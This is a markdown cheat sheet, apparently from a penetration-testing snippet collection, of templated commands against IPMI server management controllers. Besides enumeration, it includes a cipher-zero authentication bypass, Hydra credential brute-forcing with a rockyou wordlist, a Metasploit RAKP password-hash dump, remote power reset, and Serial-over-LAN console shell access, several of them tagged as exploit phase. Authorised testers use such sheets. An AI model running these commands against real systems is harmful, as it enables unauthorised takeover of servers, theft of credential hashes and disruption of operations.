# IPMI

> Out-of-band server management interface, often vulnerable to cipher-zero and password hash dump

<!-- tags: ipmi,bmc,management,hardware -->

---

## read chassis status
Connect to the BMC and read chassis status.

```bash
ipmitool -I lanplus -H {{TARGET:ip}} -U {{USERNAME:str:admin}} -P '{{PASSWORD:str}}' chassis status
```

<!-- meta: risk=low | phase=enum | tags=chassis,status -->

---

## bypass auth cipher zero
Exploit cipher suite 0 (no auth) to issue commands without credentials.

```bash
ipmitool -I lanplus -C 0 -H {{TARGET:ip}} -U {{USERNAME:str:admin}} -P '{{PASSWORD:str:any}}' chassis power status
```

<!-- meta: risk=critical | phase=exploit | tags=cipher-zero,bypass -->

---

## list users ipmi
Enumerate IPMI users on the BMC.

```bash
ipmitool -I lanplus -H {{TARGET:ip}} -U {{USERNAME:str:admin}} -P '{{PASSWORD:str}}' user list
```

<!-- meta: risk=low | phase=enum | tags=users,list -->

---

## brute login hydra
Brute force IPMI credentials.

```bash
hydra -L {{USERLIST:file:users.txt}} -P {{PASSLIST:wordlist:/usr/share/wordlists/rockyou.txt}} ipmi://{{TARGET:ip}}
```

<!-- meta: risk=med | phase=passwords | tags=hydra,brute -->

---

## dump RAKP hashes metasploit
Dump RAKP HMAC password hashes via Metasploit auxiliary.

```bash
msfconsole -q -x "use auxiliary/scanner/ipmi/ipmi_dumphashes; set RHOSTS {{TARGET:ip}}; run; exit"
```

<!-- meta: risk=high | phase=exploit | tags=metasploit,dump,hashes -->

---

## scan version metasploit
Identify IPMI version and probe for known issues.

```bash
msfconsole -q -x "use auxiliary/scanner/ipmi/ipmi_version; set RHOSTS {{TARGET:ip}}; run; exit"
```

<!-- meta: risk=safe | phase=enum | tags=metasploit,version -->

---

## control server power
Remotely control server power state.

```bash
ipmitool -I lanplus -H {{TARGET:ip}} -U {{USERNAME:str:admin}} -P '{{PASSWORD:str}}' chassis power {{ACTION:str:reset}}
```

<!-- meta: risk=critical | phase=exploit | tags=power,control -->

---

## activate SOL console shell
Activate SOL console for remote shell access.

```bash
ipmitool -I lanplus -H {{TARGET:ip}} -U {{USERNAME:str:admin}} -P '{{PASSWORD:str}}' sol activate
```

<!-- meta: risk=high | phase=exploit | tags=sol,console -->

---

## read BMC info firmware
Print BMC management controller info including firmware.

```bash
ipmitool -I lanplus -H {{TARGET:ip}} -U {{USERNAME:str:admin}} -P '{{PASSWORD:str}}' mc info
```

<!-- meta: risk=safe | phase=enum | tags=bmc,firmware -->

---

## read event log SEL
Dump the System Event Log.

```bash
ipmitool -I lanplus -H {{TARGET:ip}} -U {{USERNAME:str:admin}} -P '{{PASSWORD:str}}' sel list
```

<!-- meta: risk=safe | phase=enum | tags=sel,events -->
